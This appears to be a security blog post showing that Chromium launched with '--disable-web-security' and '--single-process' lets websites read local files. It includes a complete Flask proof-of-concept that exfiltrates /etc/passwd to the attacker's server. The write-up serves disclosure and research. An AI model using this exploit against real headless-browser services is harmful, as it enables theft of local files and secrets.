---
layout: post
title: Reading your files is two ~~steps~~ flags away
mathjax: true
share-img: https://github.com/user-attachments/assets/eb9fb52c-d320-402e-9e38-f0d95edda333
cover-img: https://github.com/user-attachments/assets/eb9fb52c-d320-402e-9e38-f0d95edda333
tags: [Exploitation]
author: M411K
---

So while I was doing some internal source code reviewing, I came across this snippet of code:

```jsx
            browser = await puppeteer.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--no-first-run',
                    '--single-process',
                    '--disable-extensions',
                    '--disable-plugins',
                    '--disable-images',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-features=TranslateUI',
                    '--disable-ipc-flooding-protection',
                    '--disable-web-security',
                    '--disable-default-apps',
                    '--disable-sync',
                    '--disable-translate',
                    // ...
                ],
                executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined
            });
            // ...
            const pdf = await page.pdf({
                format: 'A4',
                printBackground: true,
                margin: {
                    top: '15mm',
                    right: '10mm',
                    bottom: '15mm',
                    left: '10mm'
                },
                preferCSSPageSize: false
            });
```

Okay, let me guess what was prompt: *“Gimme a code that runs a browser blazingly fast”*.

Anyway, this excellent vibe coder give me a chance to explore an interesting quirk of using these two flags (`--disable-web-security` & `--single-process`).

<table>
  <tr>
    <th>--single-process <a href="https://peter.sh/experiments/chromium-command-line-switches/#single-process">⊗</a></th>
    <th>Runs the renderer and plugins in the same process as the browser [↪](https://source.chromium.org/chromium/chromium/src/+/main:content/public/common/content_switches.cc?q=kSingleProcess&ss=chromium)</th>
  </tr>
  <tr>
    <td>--disable-web-security <a href="https://peter.sh/experiments/chromium-command-line-switches/#disable-web-security">⊗</a></td>
    <td>Don't enforce the <a href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin policy</a>; meant for website testing only. This switch has no effect unless --user-data-dir (as defined by the content embedder) is also present. <a href="https://source.chromium.org/chromium/chromium/src/+/main:content/public/common/content_switches.cc?q=kDisableWebSecurity&ss=chromium">↪</a></td>
  </tr>
</table>

At first sight, these two flags don’t seem to be related —i.e affect each other, but interestingly they enable any website, to access local files, how you say, I don’t know exactly why, but `open`-ing a local file using `—-disable-web-security`  only redirects to `about:blank#blocked` , but adding the `--single-process` flag, it successfully opens the file, thus enabling the access to local files by remote websites.

# Demo

<center>
<video height="400" controls style="max-width: 90vw;">
  <source src="https://github.com/user-attachments/assets/0be530c4-bc11-4753-9c57-6859370228b7" type="video/mp4">
</video>
</center>

```python
{% raw %}
from flask import Flask, request, redirect

app = Flask(__name__)

SERVER_HOST = "http://127.0.0.1:5500"
LEAKED_FILE_NAME = "/etc/passwd"
DOWNLOADED_FILE_NAME = "file:///Users/victim/Downloads/index.html"

leaked_file_content = ""

@app.route('/content', methods=["GET"])
def content():
    global leaked_file_content
    if leaked_file_content != "":
        returned = leaked_file_content
        leaked_file_content = ""
        return returned, 200
    return leaked_file_content, 200

@app.route('/', methods=["POST"])
def upload():
    global leaked_file_content
    leaked_file_content = request.data
    return "done.", 200

@app.route('/', methods=["GET"])
def home():
    return f"""
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>PoC</title>
		<style>
			body {{
				font-family: monospace;
				margin: 20px;
				background-color: #f5f5f5;
			}}
			.code-container {{
				background: white;
				border: 1px solid #ddd;
				border-radius: 4px;
				padding: 15px;
				overflow-x: auto;
				white-space: pre;
				box-shadow: 0 1px 3px rgba(0,0,0,0.1);
			}}
		</style>
	</head>
	<body>
		<h1>Just an innocent website over here ☺️ </h1>
		<script defer>
			setTimeout(() => {{
				const blob = new Blob([`
				<script>
					fetch("file://{LEAKED_FILE_NAME}").then(r => r.text()).then(r => {{
						fetch("{SERVER_HOST}", {{
							method: "POST",
							body: r
						}}).then(_ => window.close());
					}})
				</s`, 'cript>'], {{
						type: "text/html",
				}});
				const link = document.createElement('a');
				link.hidden = true;
				link.href = URL.createObjectURL(blob);
				link.download = 'index.html';
				document.body.appendChild(link);
				link.click();
			}}, 1000);
			setTimeout(() => {{
				window.open("{DOWNLOADED_FILE_NAME}", "_blank", "");
			}}, 2000);
			let interval = setInterval(() => {{
				fetch("/content").then(r => r.text()).then(r => {{
					if (r !== "") {{
						const heading = document.createElement('h2');
						heading.innerHTML = "This is the <code>{LEAKED_FILE_NAME}</code> content isn't it 😜";
						document.body.appendChild(heading);
						const file = document.createElement('div');
						file.className = 'code-container';
						file.textContent = r;
						document.body.appendChild(file)
						clearInterval(interval);
					}}
				}})
			}}, 1000);
		</script>
	</body>
</html>
    """

if __name__ == '__main__':
    app.run(port=5500)
{% endraw %}
```

The server’s code is pretty straight forward, since the `http://` can’t load another file (in contrast to opening it), I open another file since a `file://` can access another `file://`.

Interestingly the usage of this pair of flags is [“common”](https://github.com/search?q=%22--disable-web-security%22+%22--single-process%22&type=code) <img height="20" alt="image" src="https://github.com/user-attachments/assets/0b1cbd1c-7440-48f2-8c4f-72c88cdb6fee" style="vertical-align: middle; display: inline-block;" />,And yeah this was labeled a *“Won't Fix”,* by the chromium security team and considered a *“an interesting architectural accident”* in the wording of a chromium team member*,* so keep this technique in you’re toolbelt maybe you’ll need it somewhere 🤷‍♂️.

# Weird enough?

Like it wasn’t weird enough, the exploit doesn’t work in puppeteer unless you open a new tab, huh?!, yes take a look:

<center>
<video height="400" controls style="max-width: 90vw;">
  <source src="https://github.com/user-attachments/assets/6e26b0e9-9a18-4245-9637-4d789014a6d9" type="video/mp4">
</video>
<br>
<em>Without new tab</em>
</center>
<center>
<video height="400" controls style="max-width: 90vw;">
  <source src="https://github.com/user-attachments/assets/933adf44-13ee-4645-87b7-c9e2e2c712a9" type="video/mp4">
</video>
<br>
<em>With new tab</em>
</center>

Can this be bypassed? I tried so much ways but failed to do so, I let this to the security community.
